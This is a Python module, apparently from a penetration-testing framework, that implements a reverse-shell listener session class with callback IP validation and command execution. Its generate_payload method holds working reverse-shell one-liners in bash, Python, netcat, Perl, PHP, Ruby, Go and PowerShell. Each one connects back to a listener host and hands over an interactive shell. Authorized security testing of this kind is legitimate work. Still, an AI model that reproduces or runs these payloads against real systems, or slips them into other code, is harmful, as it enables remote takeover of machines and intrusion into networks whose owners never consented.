"""
ReverseShellCapability — Listener-based interactive shell sessions.

Supports:
- TCP reverse shells (nc, bash, python, etc.)
- TLS-encrypted reverse shells
- Meterpreter-style staged payloads (future)

The CapabilityBroker provisions listeners via ListenerManager and provides
LHOST/LPORT to the payload generator. On callback, the session is wrapped
in a ReverseShellCapability instance.
"""

import asyncio
import logging
import os
import re
import socket
import time
import uuid
from dataclasses import dataclass, field
from typing import Optional, Dict, Any
from enum import Enum

from .capability import (
    InteractiveShellCapability,
    ShellCapabilityType,
    ShellConnectionInfo,
    ShellCommandResult,
    ShellCapabilityFactory,
)

logger = logging.getLogger("reverse_shell")


class ShellEncoding(str, Enum):
    """Shell output encoding."""
    UTF8 = "utf-8"
    LATIN1 = "latin-1"
    CP1252 = "cp1252"


@dataclass
class ReverseShellConnectionInfo(ShellConnectionInfo):
    """Extended connection info for reverse shells."""
    # Listener info (provided by Broker)
    lhost: str = "127.0.0.1"
    lport: int = 4444
    use_tls: bool = False
    cert_path: str = ""
    key_path: str = ""

    # Payload info
    payload_type: str = "bash"  # bash, python, nc, powershell, meterpreter
    payload_command: str = ""

    # Callback validation
    allowed_callback_cidrs: list[str] = field(default_factory=lambda: ["10.0.0.0/8", "172.16.0.0/12", "192.168.0.0/16", "127.0.0.0/8"])
    callback_timeout: float = 60.0

    # Encoding
    encoding: str = "utf-8"


class ReverseShellCapability(InteractiveShellCapability):
    """
    Reverse shell capability using a TCP/TLS listener.

    Lifecycle:
    1. Broker calls listener_manager.create_listener() -> gets (lhost, lport)
    2. Broker generates payload with LHOST/LPORT
    3. Target executes payload -> connects back
    4. Listener accepts connection -> wraps in ReverseShellCapability
    5. Session becomes ACTIVE, commands flow through send_command()
    """

    def __init__(
        self,
        connection_info: ReverseShellConnectionInfo,
        session_id: str = None,
        listener_socket: socket.socket = None,
        client_socket: socket.socket = None,
        client_addr: tuple = None,
    ):
        super().__init__(connection_info)
        if session_id:
            self._session_id = session_id
        self._listener_socket = listener_socket
        self._client_socket = client_socket
        self._client_addr = client_addr
        self._reader: asyncio.StreamReader = None
        self._writer: asyncio.StreamWriter = None
        self._encoding: str = connection_info.encoding if hasattr(connection_info, 'encoding') else "utf-8"
        self._prompt_pattern = r"[\$\#>]\s*$"
        self._banner = ""
        self._buffer = ""

    @property
    def capability_type(self) -> ShellCapabilityType:
        return ShellCapabilityType.REVERSE_TCP

    @property
    def is_connected(self) -> bool:
        return (
            self._status == "ACTIVE"
            and self._client_socket is not None
            and self._writer is not None
            and not self._writer.is_closing()
        )

    @property
    def target(self) -> str:
        if self._client_addr:
            return f"{self._client_addr[0]}:{self._client_addr[1]}"
        return f"{self.connection_info.lhost}:{self.connection_info.lport}"

    @property
    def target_ip(self) -> str:
        if self._client_addr:
            return self._client_addr[0]
        return self.connection_info.lhost

    async def connect(self) -> bool:
        """Establish connection via listener callback."""
        if self._status not in ("DISCONNECTED", "ERROR"):
            return False
        self._status = "CONNECTING"
        try:
            # If we already have a client socket, set up reader/writer directly
            if self._client_socket is not None:
                self._reader, self._writer = await asyncio.open_connection(
                    sock=self._client_socket, limit=65536,
                )
                self._banner = await self._read_initial_output()
                self._detect_prompt()
                self._status = "ACTIVE"
                self._connected_at = time.time()
                self._last_activity = time.time()
                logger.info("Reverse shell session %s connected", self._session_id)
                return True
            # Otherwise, need a listener manager to wait for callback
            logger.warning("ReverseShellCapability.connect(): no client socket, cannot connect")
            self._status = "ERROR"
            return False
        except Exception as e:
            logger.error("ReverseShellCapability connect error: %s", e)
            self._status = "ERROR"
            return False

    def _check_health(self) -> bool:
        """Check if connection is still alive."""
        if self._status not in ("ACTIVE", "IDLE"):
            return False
        try:
            if self._writer and not self._writer.is_closing():
                return True
            return False
        except Exception:
            return False

    @classmethod
    async def create_from_listener(
        cls,
        connection_info: ReverseShellConnectionInfo,
        session_id: str,
        listener_manager,
    ) -> "ReverseShellCapability":
        """
        Factory method: wait for callback on listener, return capability.

        This is called by the Broker after authorizing a reverse shell session.
        """
        cap = cls(connection_info, session_id)
        success = await cap._wait_for_callback(listener_manager)
        if not success:
            await cap.disconnect()
            raise RuntimeError(f"Reverse shell callback timeout for {session_id}")
        return cap

    async def _wait_for_callback(self, listener_manager) -> bool:
        """Wait for incoming connection on the provisioned listener."""
        try:
            # Get the listener socket from ListenerManager
            listener = listener_manager.get_listener(self.connection_info.lport)
            if not listener:
                logger.error("No listener found for port %d", self.connection_info.lport)
                return False

            self._listener_socket = listener

            # Set timeout for callback
            loop = asyncio.get_event_loop()
            self._client_socket, self._client_addr = await asyncio.wait_for(
                loop.sock_accept(self._listener_socket),
                timeout=self.connection_info.callback_timeout,
            )

            # Validate callback IP
            client_ip = self._client_addr[0]
            if not self._validate_callback_ip(client_ip):
                logger.warning("Rejected callback from unauthorized IP: %s", client_ip)
                self._client_socket.close()
                self._client_socket = None
                return False

            # Set up async reader/writer
            self._reader, self._writer = await asyncio.open_connection(
                sock=self._client_socket,
                limit=65536,
            )

            # Configure socket
            self._client_socket.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            self._client_socket.settimeout(0.1)

            # Read initial banner
            self._banner = await self._read_initial_output()
            self._detect_prompt()

            self._status = "ACTIVE"
            self._connected_at = time.time()
            self._last_activity = time.time()

            logger.info(
                "Reverse shell session %s connected from %s",
                self._session_id,
                self.target,
            )
            return True

        except asyncio.TimeoutError:
            logger.warning("Reverse shell callback timeout for session %s", self._session_id)
            return False
        except Exception as e:
            logger.error("Reverse shell callback error: %s", e)
            return False

    def _validate_callback_ip(self, ip: str) -> bool:
        """Validate callback IP against allowed CIDRs."""
        import ipaddress
        try:
            client_addr = ipaddress.ip_address(ip)
            for cidr in self.connection_info.allowed_callback_cidrs:
                if client_addr in ipaddress.ip_network(cidr):
                    return True
        except Exception:
            pass
        return False

    async def _read_initial_output(self, timeout: float = 5.0) -> str:
        """Read initial banner/output after connection."""
        output = []
        start = time.time()
        while time.time() - start < timeout:
            try:
                chunk = await asyncio.wait_for(self._reader.read(4096), timeout=0.5)
                if not chunk:
                    break
                decoded = chunk.decode(self._encoding, errors="replace")
                output.append(decoded)
                if re.search(self._prompt_pattern, decoded):
                    break
            except asyncio.TimeoutError:
                continue
            except Exception:
                break
        return "".join(output)

    def _detect_prompt(self):
        """Detect shell prompt from banner."""
        patterns = [
            r"[\w\-\.]+[@\s][\w\-\.]+[\$\#>]\s*$",
            r"root@[\w\-\.]+:.*[\$\#>]\s*$",
            r"[\w\-\.]+[\$\#>]\s*$",
            r"[\$\#>]\s*$",
        ]
        for pattern in patterns:
            if re.search(pattern, self._banner, re.MULTILINE):
                self._prompt_pattern = pattern
                return

    async def disconnect(self) -> bool:
        """Disconnect and clean up."""
        if self._status in ("DISCONNECTED", "TERMINATED", "TERMINATING"):
            return True

        self._status = "TERMINATING"
        try:
            if self._writer and not self._writer.is_closing():
                self._writer.write(b"exit\n")
                await self._writer.drain()
                await asyncio.sleep(0.2)

            if self._writer:
                self._writer.close()
                await self._writer.wait_closed()

            if self._client_socket:
                self._client_socket.close()

            self._status = "TERMINATED"
            logger.info("Reverse shell session %s disconnected", self._session_id)
            return True

        except Exception as e:
            logger.error("Error disconnecting reverse shell %s: %s", self._session_id, e)
            self._status = "TERMINATED"
            return False

    async def send_command(
        self,
        command: str,
        timeout: float = 30.0,
        expect_prompt: bool = True,
    ) -> ShellCommandResult:
        """Send command and capture output."""
        if not self.is_connected:
            raise RuntimeError(f"Reverse shell {self._session_id} not connected")

        start_time = time.time()

        try:
            # Send command
            self._writer.write((command + "\n").encode(self._encoding))
            await self._writer.drain()

            # Read until prompt or timeout
            output = []
            prompt_seen = False

            while time.time() - start_time < timeout:
                try:
                    chunk = await asyncio.wait_for(self._reader.read(4096), timeout=0.5)
                    if not chunk:
                        break
                    decoded = chunk.decode(self._encoding, errors="replace")
                    output.append(decoded)
                    if expect_prompt and re.search(self._prompt_pattern, decoded):
                        prompt_seen = True
                        break
                except asyncio.TimeoutError:
                    continue
                except Exception as e:
                    logger.debug("Read error: %s", e)
                    break

            raw_output = "".join(output)
            stdout, stderr = self._split_output(raw_output, command)
            exit_code = 0 if prompt_seen else -1

            duration_ms = (time.time() - start_time) * 1000
            self._update_activity(bytes_sent=len(command), bytes_received=len(raw_output))

            return ShellCommandResult(
                command=command,
                stdout=stdout,
                stderr=stderr,
                exit_code=exit_code,
                duration_ms=duration_ms,
                raw_output=raw_output,
            )

        except Exception as e:
            logger.error("Reverse shell command failed: %s", e)
            return ShellCommandResult(
                command=command,
                stdout="",
                stderr=str(e),
                exit_code=-1,
                duration_ms=(time.time() - start_time) * 1000,
                raw_output=str(e),
            )

    def _split_output(self, raw: str, command: str) -> tuple[str, str]:
        """Split raw output into stdout/stderr."""
        lines = raw.splitlines()
        if lines and lines[0].strip() == command.strip():
            lines = lines[1:]

        cleaned = []
        for line in lines:
            if not re.search(self._prompt_pattern, line):
                cleaned.append(line)

        return "\n".join(cleaned), ""

    async def send_raw(self, data: bytes) -> int:
        """Send raw bytes."""
        if not self.is_connected or self._writer.is_closing():
            raise RuntimeError("Not connected")
        self._writer.write(data)
        await self._writer.drain()
        return len(data)

    async def read_output(self, timeout: float = 5.0) -> str:
        """Read available output."""
        if not self.is_connected:
            return ""
        try:
            chunk = await asyncio.wait_for(self._reader.read(4096), timeout=timeout)
            return chunk.decode(self._encoding, errors="replace")
        except asyncio.TimeoutError:
            return ""
        except Exception:
            return ""

    async def resize_pty(self, cols: int, rows: int) -> bool:
        """Resize PTY (not typically supported for raw reverse shells)."""
        # Some reverse shells support resize via escape sequences
        if self.is_connected:
            try:
                resize_cmd = f"\x1b[8;{rows};{cols}t"
                await self.send_raw(resize_cmd.encode())
                self.connection_info.pty_cols = cols
                self.connection_info.pty_rows = rows
                return True
            except Exception:
                pass
        return False

    def get_banner(self) -> str:
        return self._banner

    @staticmethod
    def generate_payload(
        lhost: str,
        lport: int,
        payload_type: str = "bash",
    ) -> str:
        """Generate reverse shell payload command."""
        payloads = {
            "bash": f"bash -c 'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1'",
            "bash_alt": f"0<&196;exec 196<>/dev/tcp/{lhost}/{lport}; sh <&196 >&196 2>&196",
            "python": f"python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{lhost}\",{lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'",
            "python_short": f"python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"{lhost}\",{lport}));[os.dup2(s.fileno(),i) for i in(0,1,2)];subprocess.call([\"/bin/sh\",\"-i\"])'",
            "nc": f"nc -e /bin/sh {lhost} {lport}",
            "nc_alt": f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {lhost} {lport} >/tmp/f",
            "perl": f"perl -e 'use Socket;$i=\"{lhost}\";$p={lport};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");}}'",
            "php": f"php -r '$sock=fsockopen(\"{lhost}\",{lport});exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
            "ruby": f"ruby -rsocket -e 'exit if fork;c=TCPSocket.new(\"{lhost}\",{lport});while(cmd=c.gets);IO.popen(cmd,\"r\"){{|io|c.print io.read}}end'",
            "golang": f"echo 'package main;import(\"net\";\"os/exec\";\"os\");func main(){{c,_:=net.Dial(\"tcp\",\"{lhost}:{lport}\");cmd:=exec.Command(\"/bin/sh\");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}}' > /tmp/shell.go && go run /tmp/shell.go",
            "powershell": f"$client = New-Object System.Net.Sockets.TCPClient('{lhost}',{lport});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()",
        }
        return payloads.get(payload_type, payloads["bash"])


# Register with factory
ShellCapabilityFactory.register(ShellCapabilityType.REVERSE_TCP, ReverseShellCapability)